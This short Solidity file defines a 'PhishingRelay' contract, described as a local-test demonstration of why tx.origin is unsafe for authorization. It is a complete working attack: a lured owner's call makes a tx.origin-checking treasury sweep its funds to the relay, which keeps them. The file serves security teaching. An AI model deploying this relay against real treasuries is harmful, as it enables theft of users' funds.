// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ITreasury {
    function sweep(address payable to) external;
}

/// @notice Local-test relay used to show why tx.origin is unsafe for authorization.
contract PhishingRelay {
    function forwardSweep(ITreasury treasury) external {
        treasury.sweep(payable(address(this)));
    }

    receive() external payable {}
}
